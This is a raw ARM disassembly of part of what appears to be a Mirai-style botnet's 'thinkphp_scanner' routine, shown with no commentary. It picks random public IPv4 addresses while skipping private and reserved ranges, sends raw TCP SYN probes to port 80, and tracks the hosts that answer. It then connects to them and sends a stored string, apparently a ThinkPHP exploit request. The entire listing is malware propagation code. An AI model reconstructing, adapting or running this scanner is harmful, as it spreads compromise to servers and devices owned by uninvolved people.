   14288:	e1ce00b4 	strh	r0, [lr, #4]
   1428c:	e58e300c 	str	r3, [lr, #12]
   14290:	ebfff8d8 	bl	125f8 <rand_next>
   14294:	e1a04000 	mov	r4, r0
   14298:	e3a00000 	mov	r0, #0
   1429c:	eb000852 	bl	163ec <__GI_time>
   142a0:	e20450ff 	and	r5, r4, #255	; 0xff
   142a4:	eb00119b 	bl	18918 <srand>
   142a8:	e1a03424 	lsr	r3, r4, #8
   142ac:	e1a02824 	lsr	r2, r4, #16
   142b0:	e3550000 	cmp	r5, #0
   142b4:	1355007f 	cmpne	r5, #127	; 0x7f
   142b8:	e20360ff 	and	r6, r3, #255	; 0xff
   142bc:	e20270ff 	and	r7, r2, #255	; 0xff
   142c0:	e1a04c24 	lsr	r4, r4, #24
   142c4:	0afffff1 	beq	14290 <thinkphp_scanner+0x260>
   142c8:	e3550003 	cmp	r5, #3
   142cc:	0affffef 	beq	14290 <thinkphp_scanner+0x260>
   142d0:	e245300f 	sub	r3, r5, #15
   142d4:	e3550038 	cmp	r5, #56	; 0x38
   142d8:	13530001 	cmpne	r3, #1
   142dc:	9affffeb 	bls	14290 <thinkphp_scanner+0x260>
   142e0:	e355000a 	cmp	r5, #10
   142e4:	0affffe9 	beq	14290 <thinkphp_scanner+0x260>
   142e8:	e35500c0 	cmp	r5, #192	; 0xc0
   142ec:	035600a8 	cmpeq	r6, #168	; 0xa8
   142f0:	0affffe6 	beq	14290 <thinkphp_scanner+0x260>
   142f4:	e35500ac 	cmp	r5, #172	; 0xac
   142f8:	13a03000 	movne	r3, #0
   142fc:	03a03001 	moveq	r3, #1
   14300:	e356000f 	cmp	r6, #15
   14304:	93a03000 	movls	r3, #0
   14308:	e3530000 	cmp	r3, #0
   1430c:	0a000001 	beq	14318 <thinkphp_scanner+0x2e8>
   14310:	e356001f 	cmp	r6, #31
   14314:	9affffdd 	bls	14290 <thinkphp_scanner+0x260>
   14318:	e3550064 	cmp	r5, #100	; 0x64
   1431c:	13a03000 	movne	r3, #0
   14320:	03a03001 	moveq	r3, #1
   14324:	e356003f 	cmp	r6, #63	; 0x3f
   14328:	93a03000 	movls	r3, #0
   1432c:	e3530000 	cmp	r3, #0
   14330:	0a000001 	beq	1433c <thinkphp_scanner+0x30c>
   14334:	e356007e 	cmp	r6, #126	; 0x7e
   14338:	9affffd4 	bls	14290 <thinkphp_scanner+0x260>
   1433c:	e35500a9 	cmp	r5, #169	; 0xa9
   14340:	035600ff 	cmpeq	r6, #255	; 0xff
   14344:	0affffd1 	beq	14290 <thinkphp_scanner+0x260>
   14348:	e35500c6 	cmp	r5, #198	; 0xc6
   1434c:	13a03000 	movne	r3, #0
   14350:	03a03001 	moveq	r3, #1
   14354:	e3560011 	cmp	r6, #17
   14358:	93a03000 	movls	r3, #0
   1435c:	e3530000 	cmp	r3, #0
   14360:	0a000001 	beq	1436c <thinkphp_scanner+0x33c>
   14364:	e3560013 	cmp	r6, #19
   14368:	9affffc8 	bls	14290 <thinkphp_scanner+0x260>
   1436c:	e35500df 	cmp	r5, #223	; 0xdf
   14370:	8affffc6 	bhi	14290 <thinkphp_scanner+0x260>
   14374:	e2453006 	sub	r3, r5, #6
   14378:	e355000b 	cmp	r5, #11
   1437c:	13530001 	cmpne	r3, #1
   14380:	9affffc2 	bls	14290 <thinkphp_scanner+0x260>
   14384:	e3550016 	cmp	r5, #22
   14388:	13550015 	cmpne	r5, #21
   1438c:	0affffbf 	beq	14290 <thinkphp_scanner+0x260>
   14390:	e355001c 	cmp	r5, #28
   14394:	1355001a 	cmpne	r5, #26
   14398:	0affffbc 	beq	14290 <thinkphp_scanner+0x260>
   1439c:	e355001e 	cmp	r5, #30
   143a0:	1355001d 	cmpne	r5, #29
   143a4:	0affffb9 	beq	14290 <thinkphp_scanner+0x260>
   143a8:	e3550037 	cmp	r5, #55	; 0x37
   143ac:	13550021 	cmpne	r5, #33	; 0x21
   143b0:	0affffb6 	beq	14290 <thinkphp_scanner+0x260>
   143b4:	e35500d7 	cmp	r5, #215	; 0xd7
   143b8:	135500d6 	cmpne	r5, #214	; 0xd6
   143bc:	0affffb3 	beq	14290 <thinkphp_scanner+0x260>
   143c0:	eb0010c7 	bl	186e4 <rand>
   143c4:	e59f3754 	ldr	r3, [pc, #1876]	; 14b20 <thinkphp_scanner+0xaf0>
   143c8:	e0c21093 	smull	r1, r2, r3, r0
   143cc:	e0422fc0 	sub	r2, r2, r0, asr #31
   143d0:	e1a03082 	lsl	r3, r2, #1
   143d4:	e0833002 	add	r3, r3, r2
   143d8:	e0502003 	subs	r2, r0, r3
   143dc:	03843316 	orreq	r3, r4, #1476395008	; 0x58000000
   143e0:	01833806 	orreq	r3, r3, r6, lsl #16
   143e4:	0a0000f5 	beq	147c0 <thinkphp_scanner+0x790>
   143e8:	e3520001 	cmp	r2, #1
   143ec:	0384345f 	orreq	r3, r4, #1593835520	; 0x5f000000
   143f0:	01833806 	orreq	r3, r3, r6, lsl #16
   143f4:	0a0000f1 	beq	147c0 <thinkphp_scanner+0x790>
   143f8:	e3520002 	cmp	r2, #2
   143fc:	03843207 	orreq	r3, r4, #1879048192	; 0x70000000
   14400:	01833806 	orreq	r3, r3, r6, lsl #16
   14404:	0a0000ed 	beq	147c0 <thinkphp_scanner+0x790>
   14408:	e3520003 	cmp	r2, #3
   1440c:	0a0000e8 	beq	147b4 <thinkphp_scanner+0x784>
   14410:	e59f0704 	ldr	r0, [pc, #1796]	; 14b1c <thinkphp_scanner+0xaec>
   14414:	e59d2010 	ldr	r2, [sp, #16]
   14418:	e3a03000 	mov	r3, #0
   1441c:	e3a01014 	mov	r1, #20
   14420:	e5802010 	str	r2, [r0, #16]
   14424:	e1c030ba 	strh	r3, [r0, #10]
   14428:	ebffe910 	bl	e870 <checksum_generic>
   1442c:	e59fc6e8 	ldr	ip, [pc, #1768]	; 14b1c <thinkphp_scanner+0xaec>
   14430:	e1cc00ba 	strh	r0, [ip, #10]
   14434:	e1a0000c 	mov	r0, ip
   14438:	e59cc010 	ldr	ip, [ip, #16]
   1443c:	e3a0ea05 	mov	lr, #20480	; 0x5000
   14440:	e58bc004 	str	ip, [fp, #4]
   14444:	e3a0c000 	mov	ip, #0
   14448:	e2801014 	add	r1, r0, #20
   1444c:	e3a02b05 	mov	r2, #5120	; 0x1400
   14450:	e3a03014 	mov	r3, #20
   14454:	e1cbe0b2 	strh	lr, [fp, #2]
   14458:	e1cbc1b0 	strh	ip, [fp, #16]
   1445c:	ebffe917 	bl	e8c0 <checksum_tcpudp>
   14460:	e59fe6b0 	ldr	lr, [pc, #1712]	; 14b18 <thinkphp_scanner+0xae8>
   14464:	e59f16b0 	ldr	r1, [pc, #1712]	; 14b1c <thinkphp_scanner+0xaec>
   14468:	e59e3000 	ldr	r3, [lr]
   1446c:	e591e010 	ldr	lr, [r1, #16]
   14470:	e3a0c010 	mov	ip, #16
   14474:	e1cb01b0 	strh	r0, [fp, #16]
   14478:	e58de708 	str	lr, [sp, #1800]	; 0x708
   1447c:	e58dc004 	str	ip, [sp, #4]
   14480:	e3a0e002 	mov	lr, #2
   14484:	e28dcc07 	add	ip, sp, #1792	; 0x700
   14488:	e1cce0b4 	strh	lr, [ip, #4]
   1448c:	e1dbe0b2 	ldrh	lr, [fp, #2]
   14490:	e1cce0b6 	strh	lr, [ip, #6]
   14494:	e28dcc07 	add	ip, sp, #1792	; 0x700
   14498:	e1a00003 	mov	r0, r3
   1449c:	e28cc004 	add	ip, ip, #4
   144a0:	e3a03901 	mov	r3, #16384	; 0x4000
   144a4:	e3a02028 	mov	r2, #40	; 0x28
   144a8:	e58dc000 	str	ip, [sp]
   144ac:	eb000ab4 	bl	16f84 <__libc_sendto>
   144b0:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
   144b4:	e2833001 	add	r3, r3, #1
   144b8:	e353009f 	cmp	r3, #159	; 0x9f
   144bc:	e58d3724 	str	r3, [sp, #1828]	; 0x724
   144c0:	daffff67 	ble	14264 <thinkphp_scanner+0x234>
   144c4:	e1a09008 	mov	r9, r8
   144c8:	eb0008e2 	bl	16858 <__GI___errno_location>
   144cc:	e59de00c 	ldr	lr, [sp, #12]
   144d0:	e1a0a000 	mov	sl, r0
   144d4:	e28e5014 	add	r5, lr, #20
   144d8:	e3a04000 	mov	r4, #0
   144dc:	e3a0c000 	mov	ip, #0
   144e0:	e58ac000 	str	ip, [sl]
   144e4:	e59f162c 	ldr	r1, [pc, #1580]	; 14b18 <thinkphp_scanner+0xae8>
   144e8:	e3a02e5e 	mov	r2, #1504	; 0x5e0
   144ec:	e5910000 	ldr	r0, [r1]
   144f0:	e282200a 	add	r2, r2, #10
   144f4:	e59d100c 	ldr	r1, [sp, #12]
   144f8:	e3a03901 	mov	r3, #16384	; 0x4000
   144fc:	e58dc004 	str	ip, [sp, #4]
   14500:	e58dc000 	str	ip, [sp]
   14504:	eb000a3c 	bl	16dfc <__libc_recvfrom>
   14508:	e3500000 	cmp	r0, #0
   1450c:	da00005e 	ble	1468c <thinkphp_scanner+0x65c>
   14510:	e59a3000 	ldr	r3, [sl]
   14514:	e353000b 	cmp	r3, #11
   14518:	0a00005b 	beq	1468c <thinkphp_scanner+0x65c>
   1451c:	e3500027 	cmp	r0, #39	; 0x27
   14520:	9affffed 	bls	144dc <thinkphp_scanner+0x4ac>
   14524:	e59d300c 	ldr	r3, [sp, #12]
   14528:	e59fc5dc 	ldr	ip, [pc, #1500]	; 14b0c <thinkphp_scanner+0xadc>
   1452c:	e5932010 	ldr	r2, [r3, #16]
   14530:	e59c3000 	ldr	r3, [ip]
   14534:	e1520003 	cmp	r2, r3
   14538:	1affffe7 	bne	144dc <thinkphp_scanner+0x4ac>
   1453c:	e59de00c 	ldr	lr, [sp, #12]
   14540:	e5de3009 	ldrb	r3, [lr, #9]
   14544:	e3530006 	cmp	r3, #6
   14548:	1affffe3 	bne	144dc <thinkphp_scanner+0x4ac>
   1454c:	e1d530b0 	ldrh	r3, [r5]
   14550:	e3530a05 	cmp	r3, #20480	; 0x5000
   14554:	1affffe0 	bne	144dc <thinkphp_scanner+0x4ac>
   14558:	e1d530b2 	ldrh	r3, [r5, #2]
   1455c:	e59d1014 	ldr	r1, [sp, #20]
   14560:	e1530001 	cmp	r3, r1
   14564:	1affffdc 	bne	144dc <thinkphp_scanner+0x4ac>
   14568:	e5d5300d 	ldrb	r3, [r5, #13]
   1456c:	e3130002 	tst	r3, #2
   14570:	0affffd9 	beq	144dc <thinkphp_scanner+0x4ac>
   14574:	e3130010 	tst	r3, #16
   14578:	0affffd7 	beq	144dc <thinkphp_scanner+0x4ac>
   1457c:	e3130004 	tst	r3, #4
   14580:	1affffd5 	bne	144dc <thinkphp_scanner+0x4ac>
   14584:	e3130001 	tst	r3, #1
   14588:	1affffd3 	bne	144dc <thinkphp_scanner+0x4ac>
   1458c:	e5951008 	ldr	r1, [r5, #8]
   14590:	e20108ff 	and	r0, r1, #16711680	; 0xff0000
   14594:	e1a02c21 	lsr	r2, r1, #24
   14598:	e2013cff 	and	r3, r1, #65280	; 0xff00
   1459c:	e1822420 	orr	r2, r2, r0, lsr #8
   145a0:	e1822403 	orr	r2, r2, r3, lsl #8
   145a4:	e1822c01 	orr	r2, r2, r1, lsl #24
   145a8:	e2422001 	sub	r2, r2, #1
   145ac:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
   145b0:	e1a03c22 	lsr	r3, r2, #24
   145b4:	e1833420 	orr	r3, r3, r0, lsr #8
   145b8:	e2021cff 	and	r1, r2, #65280	; 0xff00
   145bc:	e1833401 	orr	r3, r3, r1, lsl #8
   145c0:	e59ee00c 	ldr	lr, [lr, #12]
   145c4:	e1833c02 	orr	r3, r3, r2, lsl #24
   145c8:	e153000e 	cmp	r3, lr
   145cc:	1affffc2 	bne	144dc <thinkphp_scanner+0x4ac>
   145d0:	e354007f 	cmp	r4, #127	; 0x7f
   145d4:	ca00002c 	bgt	1468c <thinkphp_scanner+0x65c>
   145d8:	e1a02284 	lsl	r2, r4, #5
   145dc:	e1a03184 	lsl	r3, r4, #3
   145e0:	e0833002 	add	r3, r3, r2
   145e4:	e0833004 	add	r3, r3, r4
   145e8:	e59f2524 	ldr	r2, [pc, #1316]	; 14b14 <thinkphp_scanner+0xae4>
   145ec:	e1a03103 	lsl	r3, r3, #2
   145f0:	e592c000 	ldr	ip, [r2]
   145f4:	e0643003 	rsb	r3, r4, r3
   145f8:	e1a03183 	lsl	r3, r3, #3
   145fc:	e083000c 	add	r0, r3, ip
   14600:	e5902008 	ldr	r2, [r0, #8]
   14604:	e3520000 	cmp	r2, #0
   14608:	12843001 	addne	r3, r4, #1
   1460c:	11a02183 	lslne	r2, r3, #3
   14610:	11a01283 	lslne	r1, r3, #5
   14614:	10822001 	addne	r2, r2, r1
   14618:	10822003 	addne	r2, r2, r3
   1461c:	11a02102 	lslne	r2, r2, #2
   14620:	10632002 	rsbne	r2, r3, r2
   14624:	11a02182 	lslne	r2, r2, #3
   14628:	108c3002 	addne	r3, ip, r2
   1462c:	11a02004 	movne	r2, r4
   14630:	0a000009 	beq	1465c <thinkphp_scanner+0x62c>
   14634:	e2822001 	add	r2, r2, #1
   14638:	e3520080 	cmp	r2, #128	; 0x80
   1463c:	0a000012 	beq	1468c <thinkphp_scanner+0x65c>
   14640:	e1a00003 	mov	r0, r3
   14644:	e5933008 	ldr	r3, [r3, #8]
   14648:	e3530000 	cmp	r3, #0
   1464c:	e2803e51 	add	r3, r0, #1296	; 0x510
   14650:	e2833008 	add	r3, r3, #8
   14654:	1afffff6 	bne	14634 <thinkphp_scanner+0x604>
   14658:	e1a04002 	mov	r4, r2
   1465c:	e3500000 	cmp	r0, #0
   14660:	0a000009 	beq	1468c <thinkphp_scanner+0x65c>
   14664:	e3a03a05 	mov	r3, #20480	; 0x5000
   14668:	e580e00c 	str	lr, [r0, #12]
   1466c:	e1c031b0 	strh	r3, [r0, #16]
   14670:	ebfffe39 	bl	13f5c <thinkphp_setup_connection>
   14674:	eaffff98 	b	144dc <thinkphp_scanner+0x4ac>
   14678:	e59f3498 	ldr	r3, [pc, #1176]	; 14b18 <thinkphp_scanner+0xae8>
   1467c:	e5930000 	ldr	r0, [r3]
   14680:	eb0015ee 	bl	19e40 <__GI___libc_close>
   14684:	e1a00005 	mov	r0, r5
   14688:	eb001223 	bl	18f1c <__GI_exit>
   1468c:	e3a03000 	mov	r3, #0
   14690:	e58d3684 	str	r3, [sp, #1668]	; 0x684
   14694:	e3a02004 	mov	r2, #4
   14698:	e282cd1a 	add	ip, r2, #1664	; 0x680
   1469c:	e2822004 	add	r2, r2, #4
   146a0:	e3a03000 	mov	r3, #0
   146a4:	e28cc004 	add	ip, ip, #4
   146a8:	e3520080 	cmp	r2, #128	; 0x80
   146ac:	e78c300d 	str	r3, [ip, sp]
   146b0:	1afffff8 	bne	14698 <thinkphp_scanner+0x668>
   146b4:	e58d3604 	str	r3, [sp, #1540]	; 0x604
   146b8:	e2833004 	add	r3, r3, #4
   146bc:	e283ec06 	add	lr, r3, #1536	; 0x600
   146c0:	e2833004 	add	r3, r3, #4
   146c4:	e3a02000 	mov	r2, #0
   146c8:	e28ee004 	add	lr, lr, #4
   146cc:	e3530080 	cmp	r3, #128	; 0x80
   146d0:	e78e200d 	str	r2, [lr, sp]
   146d4:	1afffff8 	bne	146bc <thinkphp_scanner+0x68c>
   146d8:	e1a08002 	mov	r8, r2
   146dc:	e1a07002 	mov	r7, r2
   146e0:	e1a01002 	mov	r1, r2
   146e4:	e58d2724 	str	r2, [sp, #1828]	; 0x724
   146e8:	ea000014 	b	14740 <thinkphp_scanner+0x710>
   146ec:	e2413001 	sub	r3, r1, #1
   146f0:	e3530002 	cmp	r3, #2
   146f4:	8a00003a 	bhi	147e4 <thinkphp_scanner+0x7b4>
   146f8:	e795c006 	ldr	ip, [r5, r6]
   146fc:	e28d3e72 	add	r3, sp, #1824	; 0x720
   14700:	e1a022ac 	lsr	r2, ip, #5
   14704:	e2833008 	add	r3, r3, #8
   14708:	e1a02102 	lsl	r2, r2, #2
   1470c:	e0822003 	add	r2, r2, r3
   14710:	e5121124 	ldr	r1, [r2, #-292]	; 0xfffffedc
   14714:	e20c001f 	and	r0, ip, #31
   14718:	e3a03001 	mov	r3, #1
   1471c:	e1811013 	orr	r1, r1, r3, lsl r0
   14720:	e15c0007 	cmp	ip, r7
   14724:	e5021124 	str	r1, [r2, #-292]	; 0xfffffedc
   14728:	c1a0700c 	movgt	r7, ip
   1472c:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
   14730:	e2831001 	add	r1, r3, #1
   14734:	e351007f 	cmp	r1, #127	; 0x7f
   14738:	e58d1724 	str	r1, [sp, #1828]	; 0x724
   1473c:	ca000036 	bgt	1481c <thinkphp_scanner+0x7ec>
   14740:	e1a03181 	lsl	r3, r1, #3
   14744:	e1a02281 	lsl	r2, r1, #5
   14748:	e0833002 	add	r3, r3, r2
   1474c:	e0833001 	add	r3, r3, r1
   14750:	e1a03103 	lsl	r3, r3, #2
   14754:	e0613003 	rsb	r3, r1, r3
   14758:	e59f13b4 	ldr	r1, [pc, #948]	; 14b14 <thinkphp_scanner+0xae4>
   1475c:	e5916000 	ldr	r6, [r1]
   14760:	e1a05183 	lsl	r5, r3, #3
   14764:	e0854006 	add	r4, r5, r6
   14768:	e5941008 	ldr	r1, [r4, #8]
   1476c:	e3510000 	cmp	r1, #0
   14770:	0affffed 	beq	1472c <thinkphp_scanner+0x6fc>
   14774:	e59f2394 	ldr	r2, [pc, #916]	; 14b10 <thinkphp_scanner+0xae0>
   14778:	e5923000 	ldr	r3, [r2]
   1477c:	e5942004 	ldr	r2, [r4, #4]
   14780:	e0623003 	rsb	r3, r2, r3
   14784:	e3530005 	cmp	r3, #5
   14788:	9affffd7 	bls	146ec <thinkphp_scanner+0x6bc>
   1478c:	e7950006 	ldr	r0, [r5, r6]
   14790:	eb0015aa 	bl	19e40 <__GI___libc_close>
   14794:	e3e03000 	mvn	r3, #0
   14798:	e3a02000 	mov	r2, #0
   1479c:	e7853006 	str	r3, [r5, r6]
   147a0:	e5842008 	str	r2, [r4, #8]
   147a4:	e2840018 	add	r0, r4, #24
   147a8:	e3a01c01 	mov	r1, #256	; 0x100
   147ac:	eb000102 	bl	14bbc <util_zero>
   147b0:	eaffffdd 	b	1472c <thinkphp_scanner+0x6fc>
   147b4:	e1a03806 	lsl	r3, r6, #16
   147b8:	e1833c05 	orr	r3, r3, r5, lsl #24
   147bc:	e1833004 	orr	r3, r3, r4
   147c0:	e1833407 	orr	r3, r3, r7, lsl #8
   147c4:	e20308ff 	and	r0, r3, #16711680	; 0xff0000
   147c8:	e1a02c23 	lsr	r2, r3, #24
   147cc:	e2031cff 	and	r1, r3, #65280	; 0xff00
   147d0:	e1822420 	orr	r2, r2, r0, lsr #8
   147d4:	e1822401 	orr	r2, r2, r1, lsl #8
   147d8:	e1823c03 	orr	r3, r2, r3, lsl #24
   147dc:	e58d3010 	str	r3, [sp, #16]
   147e0:	eaffff0a 	b	14410 <thinkphp_scanner+0x3e0>
   147e4:	e795c006 	ldr	ip, [r5, r6]
   147e8:	e28dee72 	add	lr, sp, #1824	; 0x720
   147ec:	e1a032ac 	lsr	r3, ip, #5
   147f0:	e1a03103 	lsl	r3, r3, #2
   147f4:	e28ee008 	add	lr, lr, #8
   147f8:	e083300e 	add	r3, r3, lr
   147fc:	e51320a4 	ldr	r2, [r3, #-164]	; 0xffffff5c
   14800:	e20c001f 	and	r0, ip, #31
   14804:	e3a01001 	mov	r1, #1
   14808:	e1822011 	orr	r2, r2, r1, lsl r0
   1480c:	e158000c 	cmp	r8, ip
   14810:	b1a0800c 	movlt	r8, ip
   14814:	e50320a4 	str	r2, [r3, #-164]	; 0xffffff5c
   14818:	eaffffc3 	b	1472c <thinkphp_scanner+0x6fc>
   1481c:	e3a0c001 	mov	ip, #1
   14820:	e3a04000 	mov	r4, #0
   14824:	e58dc714 	str	ip, [sp, #1812]	; 0x714
   14828:	e1570008 	cmp	r7, r8
   1482c:	a1a00007 	movge	r0, r7
   14830:	b1a00008 	movlt	r0, r8
   14834:	e28d1d1a 	add	r1, sp, #1664	; 0x680
   14838:	e28d2c06 	add	r2, sp, #1536	; 0x600
   1483c:	e28dce71 	add	ip, sp, #1808	; 0x710
   14840:	e28cc004 	add	ip, ip, #4
   14844:	e2811004 	add	r1, r1, #4
   14848:	e2822004 	add	r2, r2, #4
   1484c:	e1a03004 	mov	r3, r4
   14850:	e2800001 	add	r0, r0, #1
   14854:	e58dc000 	str	ip, [sp]
   14858:	e58d4718 	str	r4, [sp, #1816]	; 0x718
   1485c:	eb00068e 	bl	1629c <__libc_select>
   14860:	e1a00004 	mov	r0, r4
   14864:	eb0006e0 	bl	163ec <__GI_time>
   14868:	e59fe2a0 	ldr	lr, [pc, #672]	; 14b10 <thinkphp_scanner+0xae0>
   1486c:	e58d4724 	str	r4, [sp, #1828]	; 0x724
   14870:	e58e0000 	str	r0, [lr]
   14874:	ea00000b 	b	148a8 <thinkphp_scanner+0x878>
   14878:	e28dee72 	add	lr, sp, #1824	; 0x720
   1487c:	e28ee008 	add	lr, lr, #8
   14880:	e081200e 	add	r2, r1, lr
   14884:	e51230a4 	ldr	r3, [r2, #-164]	; 0xffffff5c
   14888:	e1a03453 	asr	r3, r3, r4
   1488c:	e3130001 	tst	r3, #1
   14890:	1a000044 	bne	149a8 <thinkphp_scanner+0x978>
   14894:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
   14898:	e2834001 	add	r4, r3, #1
   1489c:	e354007f 	cmp	r4, #127	; 0x7f
   148a0:	e58d4724 	str	r4, [sp, #1828]	; 0x724
   148a4:	cafffe68 	bgt	1424c <thinkphp_scanner+0x21c>
   148a8:	e1a03184 	lsl	r3, r4, #3
   148ac:	e1a02284 	lsl	r2, r4, #5
   148b0:	e0833002 	add	r3, r3, r2
   148b4:	e0833004 	add	r3, r3, r4
   148b8:	e59f1254 	ldr	r1, [pc, #596]	; 14b14 <thinkphp_scanner+0xae4>
   148bc:	e1a03103 	lsl	r3, r3, #2
   148c0:	e5918000 	ldr	r8, [r1]
   148c4:	e0643003 	rsb	r3, r4, r3
   148c8:	e1a07183 	lsl	r7, r3, #3
   148cc:	e7970008 	ldr	r0, [r7, r8]
   148d0:	e3700001 	cmn	r0, #1
   148d4:	e0876008 	add	r6, r7, r8
   148d8:	0affffed 	beq	14894 <thinkphp_scanner+0x864>
   148dc:	e1a022a0 	lsr	r2, r0, #5
   148e0:	e28d3e72 	add	r3, sp, #1824	; 0x720
   148e4:	e2833008 	add	r3, r3, #8
   148e8:	e1a01102 	lsl	r1, r2, #2
   148ec:	e0812003 	add	r2, r1, r3
   148f0:	e5123124 	ldr	r3, [r2, #-292]	; 0xfffffedc
   148f4:	e200401f 	and	r4, r0, #31
   148f8:	e1a03453 	asr	r3, r3, r4
   148fc:	e3130001 	tst	r3, #1
   14900:	0affffdc 	beq	14878 <thinkphp_scanner+0x848>
   14904:	e3a0c004 	mov	ip, #4
   14908:	e1a0200c 	mov	r2, ip
   1490c:	e58dc71c 	str	ip, [sp, #1820]	; 0x71c
   14910:	e28dce71 	add	ip, sp, #1808	; 0x710
   14914:	e28d3e72 	add	r3, sp, #1824	; 0x720
   14918:	e28cc00c 	add	ip, ip, #12
   1491c:	e3a04000 	mov	r4, #0
   14920:	e3a01001 	mov	r1, #1
   14924:	e58d4720 	str	r4, [sp, #1824]	; 0x720
   14928:	e58dc000 	str	ip, [sp]
   1492c:	eb0008d1 	bl	16c78 <getsockopt>
   14930:	e59d3720 	ldr	r3, [sp, #1824]	; 0x720
   14934:	e1900003 	orrs	r0, r0, r3
   14938:	1a00006c 	bne	14af0 <thinkphp_scanner+0xac0>
   1493c:	e5963008 	ldr	r3, [r6, #8]
   14940:	e3530002 	cmp	r3, #2
   14944:	0a000050 	beq	14a8c <thinkphp_scanner+0xa5c>
   14948:	e3530003 	cmp	r3, #3
   1494c:	0a000067 	beq	14af0 <thinkphp_scanner+0xac0>
   14950:	e7973008 	ldr	r3, [r7, r8]
   14954:	e1a022a3 	lsr	r2, r3, #5
   14958:	e203401f 	and	r4, r3, #31
   1495c:	e1a01102 	lsl	r1, r2, #2
   14960:	e3a03002 	mov	r3, #2
   14964:	e5863008 	str	r3, [r6, #8]
   14968:	eaffffc2 	b	14878 <thinkphp_scanner+0x848>
   1496c:	03a03068 	moveq	r3, #104	; 0x68
   14970:	058a3000 	streq	r3, [sl]
   14974:	0a000004 	beq	1498c <thinkphp_scanner+0x95c>
   14978:	e3700001 	cmn	r0, #1
   1497c:	1a000023 	bne	14a10 <thinkphp_scanner+0x9e0>
   14980:	e59a3000 	ldr	r3, [sl]
   14984:	e353000b 	cmp	r3, #11
   14988:	0affffc1 	beq	14894 <thinkphp_scanner+0x864>
   1498c:	e5963008 	ldr	r3, [r6, #8]
   14990:	e3530002 	cmp	r3, #2
   14994:	1a000032 	bne	14a64 <thinkphp_scanner+0xa34>
   14998:	e5960000 	ldr	r0, [r6]
   1499c:	eb001527 	bl	19e40 <__GI___libc_close>
   149a0:	e1a00006 	mov	r0, r6
   149a4:	ebfffd6c 	bl	13f5c <thinkphp_setup_connection>
   149a8:	e5963008 	ldr	r3, [r6, #8]
   149ac:	e3530000 	cmp	r3, #0
   149b0:	0affffb7 	beq	14894 <thinkphp_scanner+0x864>
   149b4:	e5963014 	ldr	r3, [r6, #20]
   149b8:	e3530c01 	cmp	r3, #256	; 0x100
   149bc:	12865018 	addne	r5, r6, #24
   149c0:	0a00001e 	beq	14a40 <thinkphp_scanner+0xa10>
   149c4:	e3a07000 	mov	r7, #0
   149c8:	e58a7000 	str	r7, [sl]
   149cc:	e5962014 	ldr	r2, [r6, #20]
   149d0:	e0854002 	add	r4, r5, r2
   149d4:	e5960000 	ldr	r0, [r6]
   149d8:	e2622c01 	rsb	r2, r2, #256	; 0x100
   149dc:	e1a01004 	mov	r1, r4
   149e0:	e3a03901 	mov	r3, #16384	; 0x4000
   149e4:	eb0008d6 	bl	16d44 <__libc_recv>
   149e8:	e3500000 	cmp	r0, #0
   149ec:	daffffde 	ble	1496c <thinkphp_scanner+0x93c>
   149f0:	e1a02007 	mov	r2, r7
   149f4:	e7d23004 	ldrb	r3, [r2, r4]
   149f8:	e3530000 	cmp	r3, #0
   149fc:	02833041 	addeq	r3, r3, #65	; 0x41
   14a00:	07c23004 	strbeq	r3, [r2, r4]
   14a04:	e2822001 	add	r2, r2, #1
   14a08:	e1520000 	cmp	r2, r0
   14a0c:	1afffff8 	bne	149f4 <thinkphp_scanner+0x9c4>
   14a10:	e59f10f8 	ldr	r1, [pc, #248]	; 14b10 <thinkphp_scanner+0xae0>
   14a14:	e5963014 	ldr	r3, [r6, #20]
   14a18:	e5912000 	ldr	r2, [r1]
   14a1c:	e0833000 	add	r3, r3, r0
   14a20:	e5863014 	str	r3, [r6, #20]
   14a24:	e5862004 	str	r2, [r6, #4]
   14a28:	e1a00005 	mov	r0, r5
   14a2c:	eb00003d 	bl	14b28 <util_strlen>
   14a30:	e3a03000 	mov	r3, #0
   14a34:	e0860000 	add	r0, r6, r0
   14a38:	e5c03018 	strb	r3, [r0, #24]
   14a3c:	eaffffd9 	b	149a8 <thinkphp_scanner+0x978>
   14a40:	e2865018 	add	r5, r6, #24
   14a44:	e1a00005 	mov	r0, r5
   14a48:	e2861058 	add	r1, r6, #88	; 0x58
   14a4c:	e3a020c0 	mov	r2, #192	; 0xc0
   14a50:	eb00079a 	bl	168c0 <__GI_memmove>
   14a54:	e5963014 	ldr	r3, [r6, #20]
   14a58:	e2433040 	sub	r3, r3, #64	; 0x40
   14a5c:	e5863014 	str	r3, [r6, #20]
   14a60:	eaffffd7 	b	149c4 <thinkphp_scanner+0x994>
   14a64:	e5960000 	ldr	r0, [r6]
   14a68:	eb0014f4 	bl	19e40 <__GI___libc_close>
   14a6c:	e3a03000 	mov	r3, #0
   14a70:	e3e02000 	mvn	r2, #0
   14a74:	e5863008 	str	r3, [r6, #8]
   14a78:	e5862000 	str	r2, [r6]
   14a7c:	e1a00005 	mov	r0, r5
   14a80:	e3a01c01 	mov	r1, #256	; 0x100
   14a84:	eb00004c 	bl	14bbc <util_zero>
   14a88:	eaffff81 	b	14894 <thinkphp_scanner+0x864>
   14a8c:	e2864f46 	add	r4, r6, #280	; 0x118
   14a90:	e59f108c 	ldr	r1, [pc, #140]	; 14b24 <thinkphp_scanner+0xaf4>
   14a94:	e1a00004 	mov	r0, r4
   14a98:	eb00002c 	bl	14b50 <util_strcpy>
   14a9c:	e1a00004 	mov	r0, r4
   14aa0:	e7975008 	ldr	r5, [r7, r8]
   14aa4:	eb00001f 	bl	14b28 <util_strlen>
   14aa8:	e3a03901 	mov	r3, #16384	; 0x4000
   14aac:	e1a02000 	mov	r2, r0
   14ab0:	e1a01004 	mov	r1, r4
   14ab4:	e1a00005 	mov	r0, r5
   14ab8:	eb000902 	bl	16ec8 <__libc_send>
   14abc:	e1a00004 	mov	r0, r4
   14ac0:	e3a01b01 	mov	r1, #1024	; 0x400
   14ac4:	eb00003c 	bl	14bbc <util_zero>
   14ac8:	e3a01c01 	mov	r1, #256	; 0x100
   14acc:	e2860018 	add	r0, r6, #24
   14ad0:	eb000039 	bl	14bbc <util_zero>
   14ad4:	e7970008 	ldr	r0, [r7, r8]
   14ad8:	eb0014d8 	bl	19e40 <__GI___libc_close>
   14adc:	e1a00006 	mov	r0, r6
   14ae0:	ebfffd1d 	bl	13f5c <thinkphp_setup_connection>
   14ae4:	e3a03003 	mov	r3, #3
   14ae8:	e5863008 	str	r3, [r6, #8]
   14aec:	eaffff68 	b	14894 <thinkphp_scanner+0x864>
